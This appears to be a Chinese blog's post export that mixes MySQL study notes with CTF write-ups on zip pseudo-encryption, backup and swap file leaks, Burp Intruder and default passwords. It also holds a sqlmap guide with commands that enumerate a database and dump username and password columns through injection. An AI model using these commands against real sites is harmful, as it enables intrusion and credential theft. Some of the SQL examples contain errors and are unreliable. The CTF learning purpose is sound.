title="常见的约束类型"></a>常见的约束类型</h2><ol><li>not null非空，指定某列不为空（注意区分空和空格的关系）</li><li>unique：唯一约束，指定某列和几列组合的数据不能重复</li><li>primary key:主键约束，指定某列的数据不能重复，唯一</li><li>foreign key:外键，指定该列记录属于主表中的一条记录，参照另一条记录</li><li>check：检查，指定一个表达式，用于检验指定数据</li></ol><h3 id="primary-key-not-null-unique"><a href="#primary-key-not-null-unique" class="headerlink" title="primary key = not null + unique"></a>primary key = not null + unique</h3><ol><li>主键是用来唯一标识表中的每一行，类型一般为整型或者字符串</li><li>具有主键约束的列不允许有null值，不允许有重复值</li><li>每个表最多只允许一个主键，可定义联合主键，主键名总是PRIMARY</li></ol><h4 id="联合主键"><a href="#联合主键" class="headerlink" title="联合主键"></a>联合主键</h4><ol><li>用几个列来进行唯一标识一行<pre><code> constraint pk_id_name primary_key(id,name)</code></pre></li><li>constraint可以给键进行重命名，但是在数据字典中，主键名还是显示primary</li></ol><h3 id="foreign-key外键约束"><a href="#foreign-key外键约束" class="headerlink" title="foreign key外键约束"></a>foreign key外键约束</h3><ol><li>参照完整性约束，保证一个或两个表之间的参照完整性，外键是构建于一个表的两个字段或者是两个表的两个字段之间的参照关系<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4></li><li>具有外键约束的列的值不能随便给，必须满足外键所引用的主键的取值</li><li>一张表中可以定义多个外键</li><li>外键列默认可以给null值<h3 id="父子表"><a href="#父子表" class="headerlink" title="父子表"></a>父子表</h3></li><li>外键所在的表叫做子表，从表</li><li>外键所引用的主键所在的表叫做父表，主表<pre><code> constraint emp_deptid_fk foreign_key(deptid) references dept(deptid)</code></pre><h4 id="外键的删除规则"><a href="#外键的删除规则" class="headerlink" title="外键的删除规则"></a>外键的删除规则</h4></li><li>当删除父表中的行时，如果子表中有依赖被删除的父行的子行存在，那么就不允许删除，并抛出异常（默认对外键使用on delete restrict或on delete no action选项）</li><li>在定义外键约束时，可以通过使用on delete cascade或on delete set null来改变外加的默认删除规则</li><li>on delete cascade：级联删除，当删除父表中的行时，如果子表中有依赖于被删除父行的子行存在，那么联通子行一起删除，相当于rm -f</li><li>on delete set null：当删除父表中的行时，如果子表中有依赖于被删除的父行的子行存在，那么不删除，而是将子行的外键设置为null<h4 id="外键引用定义"><a href="#外键引用定义" class="headerlink" title="外键引用定义"></a>外键引用定义</h4><pre><code> reference_definition:     REFERENCES tbl_name (index_col_name,...)     [MATCH FULL | MATCH PARTIAL | MATCH SIMPLE]     [ON DELETE reference_option]     [ON UPDATE reference_option] reference_option:     RESTRICT | CASCADE | SET NULL | NO ACTION</code></pre></li></ol><h3 id="check约束"><a href="#check约束" class="headerlink" title="check约束"></a>check约束</h3><ol><li><p>MySQl中可以使用check约束，但是check约束对数据验证没有任何作用。</p></li><li><p>Oracle中国可以使用check约束，有相应作用</p><pre><code> mysql&gt; create table test_ck(     -&gt;   id int check(id&gt;0)     -&gt; ); mysql&gt; insert into test_ck values(-100); mysql&gt; select * from test_ck; +------+ | id   | +------+ | -100 | +------+</code></pre></li><li><p>也可以使用ENUM和set来变通地实现check约束，ENUM只能选一个值，SET可以选择多个值</p></li></ol><h3 id="AUTO-INCREMENT"><a href="#AUTO-INCREMENT" class="headerlink" title="AUTO_INCREMENT"></a>AUTO_INCREMENT</h3><ol><li>自增</li><li>缺点：当删除上一条时会在删除的上一条的基础上加1，不会覆盖原来删除的编号</li><li>列的数值自动增长，列的类型只能是整数类型</li><li>通常给主键添加自增长约束</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql中的所有引擎</title>
      <link href="/mysql%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%BC%95%E6%93%8E/"/>
      <url>/mysql%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql中所有的引擎"><a href="#mysql中所有的引擎" class="headerlink" title="mysql中所有的引擎"></a>mysql中所有的引擎</h1><h2 id="innoDB"><a href="#innoDB" class="headerlink" title="innoDB:"></a>innoDB:</h2><ol><li>innoDB存储文件有两个，后缀分别为.frm和.idb，其中.frm是表的定义文件，而.idb是数据文件</li><li>innoDB中存在表锁和行锁，行锁是在命中索引的情况下才会起作用</li></ol><h2 id="Myisam"><a href="#Myisam" class="headerlink" title="Myisam"></a>Myisam</h2><ol><li>存储文件有三个，后缀分别为.frm,.MYD和.MYI，其中.frm是表的定义文件，.MYD是数据文件，.MYI是索引文件</li><li>Myisam只支持表锁，且不支持事务，Myisam由于有单独的索引文件，在读取数据方面的性能很高</li><li>存储结构:innoDB和Myisam都是用B+Tree来存储数据的</li></ol><h1 id="mysql的索引"><a href="#mysql的索引" class="headerlink" title="mysql的索引"></a>mysql的索引</h1><ol><li>索引是一种用来实现MySQL高效获取数据的数据结构</li><li>在某个字段上建立索引，意思就是让mysql对该字段以索引这种数据结构来存储，然后查找的时候就有对应的查找算法</li><li>每种查找算法都只能应用于特定的数据结构之上：顺序查找以来于顺序结构，折半查找通过二叉寻找树或者红黑树实现二分搜索，在数据之外，数据库还维持着满足特定查找算法的数据结构，这种数据结构就是索引</li></ol><h1 id="MySQL的B-Tree"><a href="#MySQL的B-Tree" class="headerlink" title="MySQL的B+Tree"></a>MySQL的B+Tree</h1><ol><li>目前大多数的数据库系统和文件系统都采用B-Tree或其变种B+Tree作为索引结构</li><li>B+树索引是B+树在数据库中的一种实现，B+树中的B表示平衡，而不是二叉</li></ol><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://blog.csdn.net/ws1296931325/article/details/86657346">https://blog.csdn.net/ws1296931325/article/details/86657346</a></li><li>如有侵权，请联系我删除，谢谢</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql workbench table加check约束</title>
      <link href="/mysql%E5%8A%A0check%E7%BA%A6%E6%9D%9F/"/>
      <url>/mysql%E5%8A%A0check%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="加check约束"><a href="#加check约束" class="headerlink" title="加check约束"></a>加check约束</h1><ol><li>选择Datatype类，下拉选择ENUM(‘男’，’女’)</li><li>即为枚举类型，加check约束后的，仅限于男和女两种数据的约束</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql约束</title>
      <link href="/create%20tables%E9%80%89%E9%A1%B9/"/>
      <url>/create%20tables%E9%80%89%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="create-tables选项"><a href="#create-tables选项" class="headerlink" title="create tables选项"></a>create tables选项</h1><h2 id="定义列的时候，指定列选项"><a href="#定义列的时候，指定列选项" class="headerlink" title="定义列的时候，指定列选项"></a>定义列的时候，指定列选项</h2><h2 id="约束的概念"><a href="#约束的概念" class="headerlink" title="约束的概念"></a>约束的概念</h2><ol><li>对表中的数据进行限定，保证数据的正确性。有效性和完整性<h3 id="DEFAULT-定义列的默认值"><a href="#DEFAULT-定义列的默认值" class="headerlink" title="DEFAULT 定义列的默认值"></a>DEFAULT 定义列的默认值</h3></li><li>当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值，如果没有为null</li><li>sex char(1) default ‘m’</li></ol><h3 id="COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中"><a href="#COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中" class="headerlink" title="COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中"></a>COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中</h3><ol><li>创建带有列注释的表stu_comment<br>create table stu_comment(<br> id int not null primary key,<br> comment ‘学号’<br> name varchar(20) not null,<br> comment ‘姓名’<br>);<h4 id="从数据字典查询注释信息"><a href="#从数据字典查询注释信息" class="headerlink" title="从数据字典查询注释信息"></a>从数据字典查询注释信息</h4></li><li>select comumn_name,column_comment</li><li>from information_schema.columns</li><li>where table_name=’stu_comment’</li></ol><h1 id="常见的约束类型"><a href="#常见的约束类型" class="headerlink" title="常见的约束类型"></a>常见的约束类型</h1><ol><li>not null 非空类型，指定某列不为空</li><li>unique 唯一约束，指定某列和几列组合的数据不能重复</li><li>primary key 主键约束，指定某列的数据不能重复</li><li>foreign key 外键,指定该列记录属于主表中的一条记录，参照另一条数据</li><li>check 检查，指定一个表达式，用于检验指定数据</li></ol><p>CREATE TABLE table_name(<br>    column_name datetype [not null] [unique key] [primary key] [check(expr)]<br>);</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>foreign key用法详解</title>
      <link href="/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
      <url>/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="foreign-key用法详解"><a href="#foreign-key用法详解" class="headerlink" title="foreign key用法详解"></a>foreign key用法详解</h1><h2 id="引子：把所有数据都存放于一张表的弊端"><a href="#引子：把所有数据都存放于一张表的弊端" class="headerlink" title="引子：把所有数据都存放于一张表的弊端"></a>引子：把所有数据都存放于一张表的弊端</h2><ol><li>组织结构复杂比清晰</li><li>浪费空间</li><li>拓展性差</li></ol><h2 id="表和表之间存在的三种关系"><a href="#表和表之间存在的三种关系" class="headerlink" title="表和表之间存在的三种关系"></a>表和表之间存在的三种关系</h2><ol><li>一对多</li><li>多对多</li><li>一对一</li></ol><h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><ol><li>先站在表emp的角度</li><li>去找表emp的多条记录能否对应表dep的一条记录。</li><li>翻译2的意义：</li><li>左表emp的多条记录==》多个员工</li><li>右表dep的一条记录==》一个部门</li><li>最终翻译结果：多个员工是否可以属于一个部门？</li><li>如果是则需要进行part2的流程</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip伪加密</title>
      <link href="/%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/"/>
      <url>/%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="参考博客地址"><a href="#参考博客地址" class="headerlink" title="参考博客地址"></a>参考博客地址</h1><ol><li><a href="https://www.cnblogs.com/cute-puli/p/16042101.html">https://www.cnblogs.com/cute-puli/p/16042101.html</a></li></ol><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><h2 id="010或者winhex"><a href="#010或者winhex" class="headerlink" title="010或者winhex"></a>010或者winhex</h2><ol><li>建议使用010editor</li><li>因为可以自动区分数据区，目录区和目录结束标志<h3 id="zip文件组成"><a href="#zip文件组成" class="headerlink" title="zip文件组成"></a>zip文件组成</h3></li><li>压缩源文件数据区</li><li>压缩源文件目录区</li><li>压缩源文件目录结束标志</li></ol><h1 id="奇数为加密，偶数为不加密"><a href="#奇数为加密，偶数为不加密" class="headerlink" title="奇数为加密，偶数为不加密"></a>奇数为加密，偶数为不加密</h1><h1 id="无加密："><a href="#无加密：" class="headerlink" title="无加密："></a>无加密：</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录区的全局方式位标记应为00 00</li></ol><h1 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录区的全局加密方式应为 00 90</li></ol><h1 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录去的全局方式应为00 90</li></ol><p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度</p><p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p><p>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> zip伪加密 </category>
          
          <category> 文件修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 文件修复 </tag>
            
            <tag> zip伪加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息泄露</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h1 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h1><h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><h2 id="bak文件下载"><a href="#bak文件下载" class="headerlink" title="bak文件下载"></a>bak文件下载</h2><ol><li>访问目录下的bak文件</li><li>题目提示source 在index.php下，所以用hackbar访问index.php.bak</li><li>将bak文件后缀改为txt或者用notepad++打开即可获得flag</li></ol><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><ol><li>vim会自动生成备份文件和临时文件</li><li>临时文件是在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除</li><li>如果意外退出则会保留，名为.filename.swp</li><li>第一次产生的交换文件名为“.filename.txt.swp”；再次意外退出后，将会产生名为“.filename.txt.swo”的交换文件；而第三次产生的交换文件则为“.filename.txt.swn</li><li>因为这里已经告诉我们是index.php了，所以其意外退出而保留的临时文件是 .index.php.swp</li></ol><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><ol><li>直接打开页面发现是phpinfo界面</li><li>思路是从表中搜索flag的信息</li><li>浏览器中ctrl+f查找（和wires hark相同）flag</li></ol><h1 id="信息泄露问题"><a href="#信息泄露问题" class="headerlink" title="信息泄露问题"></a>信息泄露问题</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><ol><li>用菜刀爬或者用御剑字典爆破搜就完了</li><li><a href="https://imgtu.com/i/H2keX9"><img src="https://s4.ax1x.com/2022/02/15/H2keX9.md.png" alt="H2keX9.md.png"></a></li><li>观察之间的不同</li><li>一开始我还以为c=d o=a之类的是将下部的challenge那一串替换，结果发现我想多了</li><li>里面有flag_in_here.txt，双击打开后发现了flag</li><li><a href="https://imgtu.com/i/H2AV4f"><img src="https://s4.ax1x.com/2022/02/15/H2AV4f.md.png" alt="H2AV4f.md.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息泄露 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春季训练赛</title>
      <link href="/2022%E6%98%A5%E5%AD%A3%E8%AE%AD%E7%BB%83%E8%B5%9B/"/>
      <url>/2022%E6%98%A5%E5%AD%A3%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2022春季训练赛"><a href="#2022春季训练赛" class="headerlink" title="2022春季训练赛"></a>2022春季训练赛</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到："><a href="#签到：" class="headerlink" title="签到："></a>签到：</h3><ol><li>010editor打开发现PK开头，知道是一个zip压缩包</li><li>更改后缀为.zip，解压打开发现flag</li></ol><h3 id="签到：-1"><a href="#签到：-1" class="headerlink" title="签到："></a>签到：</h3><ol><li>BASE85{6:”O=1GX;K8jQKJ;G(“;DhKL9h)S6;BsD:IJ&gt;[;HHmd9h[rJ1c/0%&lt;(g@i6&lt;6QU&lt;\d]P7RpNU:eETA&lt;BWK.4ZtrV}</li><li>BASE85解一层出base35</li><li><a href="https://imgtu.com/i/qwIiNQ"><img src="https://s1.ax1x.com/2022/03/27/qwIiNQ.png" alt="qwIiNQ.png"></a></li><li>再解一层给出微信id</li><li><a href="https://imgtu.com/i/qwIE3n"><img src="https://s1.ax1x.com/2022/03/27/qwIE3n.png" alt="qwIE3n.png"></a></li><li>微信加好友有备注即可获得flag</li></ol><h3 id="黑化的维亚"><a href="#黑化的维亚" class="headerlink" title="黑化的维亚"></a>黑化的维亚</h3><ol><li>用stegsolve打开，查看不同色域下的图片</li><li><a href="https://imgtu.com/i/qwIgDf"><img src="https://s1.ax1x.com/2022/03/27/qwIgDf.png" alt="qwIgDf.png"></a></li><li>找到flag的上一级（我一开始还以为这就是flag，提交不对）</li><li>后面看到!123和fkvd这么不规则但是又像flag的</li><li>后面尝试偏移量为0，1，2，3的栅栏密码，即可解得flag</li></ol><h3 id="0和1的故事"><a href="#0和1的故事" class="headerlink" title="0和1的故事"></a>0和1的故事</h3><ol><li>解压后里面有一个txt文件，打开后看最后发现有==，知道是base64解码</li><li><a href="https://imgtu.com/i/qwb2tO"><img src="https://s1.ax1x.com/2022/03/27/qwb2tO.png" alt="qwb2tO.png"></a></li><li>解码网站<a href="https://the-x.cn/base64/">https://the-x.cn/base64/</a></li><li>解码后发现里面有一个png文件，图片中全是01字符</li><li><a href="https://imgtu.com/i/qwbonI"><img src="https://s1.ax1x.com/2022/03/27/qwbonI.png" alt="qwbonI.png"></a></li><li>两种选择，一种是利用手机去扫描出文本，第二种是在linux环境下cat出01字符串</li><li>得到01字符一开始还以为是一个二进制文件或者是培根密码，然后我五位一解，（解出来的都是什么东西。。。）（培根密码是0为a，1为b，依此得出不同字符）</li><li>长和宽相同的情况下猜测是二维码，但是上学期学的py都被时间冲刷干净了，我就在网上找脚本，但是找到的因为MAXN设定的不同，无法得到正确的二维码（轻易改动数据，也会出现数组越界的segementation fault的问题）</li><li>后面用excel表格去做，将1所在的单元格填充为黑色，0所在的单元格填充为白色（可能出现的绿色不会影响二维码扫描）</li><li><a href="https://imgtu.com/i/qwbbAf"><img src="https://s1.ax1x.com/2022/03/27/qwbbAf.png" alt="qwbbAf.png"></a></li><li>扫描后即可得到flag{Stories_of_0_and_1}</li></ol><h2 id="web题"><a href="#web题" class="headerlink" title="web题"></a>web题</h2><h3 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h3><ol><li>上来一看什么也没有，就猜测是哪几种题型（反正不可能上来就是sql注入文件上传之类的，没有地方注入东西）</li><li>用御剑字典爆破后缀或者用spider去爬，发现有一个txt为后缀的，打开网页得到4ll.html</li><li>我一开始还以为是411，结果404就搁置了好久，最后有hint发布，“411和4ll真的能分清吗”，在hackbar中打开，给后缀，excute后给出I have tell you all的字符,还是没有什么东西</li><li>ctrl + u查看源代码发现flag</li><li>这里由于没有保留截图，也没有环境，暂无截图</li></ol><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><ol><li>我不知道给的那个hint是什么意思。。。</li><li>强大的工具一把梭，我sqlmap跑了好久都没有</li><li>这里浅谈一下我的思路吧</li><li>两个登录框，分别给出1，1，用burp抓包，发现是post包，post注入</li><li><a href="https://imgtu.com/i/qwLEIf"><img src="https://s1.ax1x.com/2022/03/27/qwLEIf.png" alt="qwLEIf.png"></a></li><li><a href="https://imgtu.com/i/qwLJiT"><img src="https://s1.ax1x.com/2022/03/27/qwLJiT.png" alt="qwLJiT.png"></a></li><li>sqlmap post注入的命令分别是：</li><li>sqlmap -r “admin.txt” –dbs (–level n)(默认为level 1)</li><li>sqlmap -r “admin.txt” -D xxx –tables</li><li>sqlmap -r “admin.txt” -D xxx -T xxx –columns</li><li>sqlmap -r “admin.txt” -D xxx –T xxx -C xxx –dump</li></ol><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><ol><li>猪圈+银河骑士+圣殿+栅栏</li><li><a href="https://imgtu.com/i/qwL7Y8"><img src="https://s1.ax1x.com/2022/03/27/qwL7Y8.png" alt="qwL7Y8.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit intruder的四种攻击方式</title>
      <link href="/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="burpsuit-intruder的四种攻击方式"><a href="#burpsuit-intruder的四种攻击方式" class="headerlink" title="burpsuit intruder的四种攻击方式"></a>burpsuit intruder的四种攻击方式</h1><h2 id="sniper狙击手模式"><a href="#sniper狙击手模式" class="headerlink" title="sniper狙击手模式"></a>sniper狙击手模式</h2><ol><li>使用一组payload集合，一次只使用一个payload位置<h2 id="battering-ram-攻城锤模式"><a href="#battering-ram-攻城锤模式" class="headerlink" title="battering ram 攻城锤模式"></a>battering ram 攻城锤模式</h2></li><li>只使用一个payload集合，每次攻击都是替换所有payload标记位置</li><li>与狙击手模式不同点在于狙击手每次只替换一个标记位置，而攻城锤替换所有的标记位置<h2 id="三Pitchfork（草叉模式）"><a href="#三Pitchfork（草叉模式）" class="headerlink" title="三Pitchfork（草叉模式）"></a>三Pitchfork（草叉模式）</h2><h2 id="四Cluster-bomb（集束炸弹模式）"><a href="#四Cluster-bomb（集束炸弹模式）" class="headerlink" title="四Cluster bomb（集束炸弹模式）"></a>四Cluster bomb（集束炸弹模式）</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用方法</title>
      <link href="/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h1><h2 id="判断是否能注入"><a href="#判断是否能注入" class="headerlink" title="判断是否能注入"></a>判断是否能注入</h2><ol><li>python sqlmap.py -u “url?id=1”<h2 id="找库"><a href="#找库" class="headerlink" title="找库"></a>找库</h2></li><li>python sqlmap.py -u “url?id=1” –dbs</li></ol><h2 id="找表"><a href="#找表" class="headerlink" title="找表"></a>找表</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 –tables</li></ol><h2 id="找列"><a href="#找列" class="headerlink" title="找列"></a>找列</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 –columns</li></ol><h2 id="dump掉信息"><a href="#dump掉信息" class="headerlink" title="dump掉信息"></a>dump掉信息</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 -C 列名 –dump</li><li>或者列名前加–columns</li></ol><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://www.cnblogs.com/ichunqiu/p/5805108.html">https://www.cnblogs.com/ichunqiu/p/5805108.html</a></li></ol><h1 id="嗅探等级："><a href="#嗅探等级：" class="headerlink" title="嗅探等级："></a>嗅探等级：</h1><h2 id="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"><a href="#不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢" class="headerlink" title="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"></a>不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢</h2><h2 id="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"><a href="#当不能确定哪个payload时或参数作为注入点，可以使用较高的level值" class="headerlink" title="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"></a>当不能确定哪个payload时或参数作为注入点，可以使用较高的level值</h2><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><ol><li>http cookie测试</li></ol><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><ol><li>http user-agent/referer头回测试</li></ol><h1 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://blog.csdn.net/a_small_rabbit/article/details/101110011">https://blog.csdn.net/a_small_rabbit/article/details/101110011</a></li></ol><h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><ol><li>用burp抓包</li><li>将抓到的包保存为.txt文件类型(右击，copy to file)</li><li>sqlmap中的命令：sqlmap -r “admin.txt” -p n –dbs(-r表示加载一个文件，-p指定参数)</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 –tables</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 –columns</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 -C “username,password” –dump</li></ol><h2 id="指定参数（get传参来实现post注入）"><a href="#指定参数（get传参来实现post注入）" class="headerlink" title="指定参数（get传参来实现post注入）"></a>指定参数（get传参来实现post注入）</h2><ol><li>sqlmap -u “url” –data “n=1&amp;p=1” –dbs(与上面类似)</li><li>sqlmap -u “url” –data “username=1&amp;password=1” –dbs(假设参数是username和password)</li></ol><h2 id="r指定文件去暴库"><a href="#r指定文件去暴库" class="headerlink" title="-r指定文件去暴库"></a>-r指定文件去暴库</h2><ol><li>python sqlmap.py -r 文件路径+文件名.txt –dbs</li></ol><h2 id="forms"><a href="#forms" class="headerlink" title="-forms"></a>-forms</h2><ol><li>使用该命令，使sqlmap自己抓包</li><li>sqlmap -u “url” –forms –level=5 –dbs</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本小子 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 脚本小子 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub的默认口令</title>
      <link href="/ctfhub%E7%9A%84%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
      <url>/ctfhub%E7%9A%84%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfhub的默认口令"><a href="#ctfhub的默认口令" class="headerlink" title="ctfhub的默认口令"></a>ctfhub的默认口令</h1><ol><li><a href="https://imgtu.com/i/qZKhQ0"><img src="https://s1.ax1x.com/2022/03/20/qZKhQ0.png" alt="qZKhQ0.png"></a></li><li>三个登录框，一开始想用burp的intruder去爆破，或者绕过验证码</li><li>后来看wp知道给的eyou右键网关的意义是让我们去寻找默认口令</li></ol><h1 id="ctfhub的备份文件"><a href="#ctfhub的备份文件" class="headerlink" title="ctfhub的备份文件"></a>ctfhub的备份文件</h1><ol><li><a href="https://imgtu.com/i/qZbrGt"><img src="https://s1.ax1x.com/2022/03/20/qZbrGt.png" alt="qZbrGt.png"></a></li><li>给出常见的网站源码备份文件后缀和常见的网站源码备份文件名</li><li>一个一个组合起来试一试，发现<a href="http://www.zip是可行的,作为后缀可以给出一个zip文件/">www.zip是可行的，作为后缀可以给出一个zip文件</a></li><li>将爆出的txt文件的文件名作为后缀用hackbar打开，可以爆出flag</li><li><a href="https://imgtu.com/i/qZqEod"><img src="https://s1.ax1x.com/2022/03/20/qZqEod.png" alt="qZqEod.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>adduser</title>
      <link href="/adduser/"/>
      <url>/adduser/</url>
      
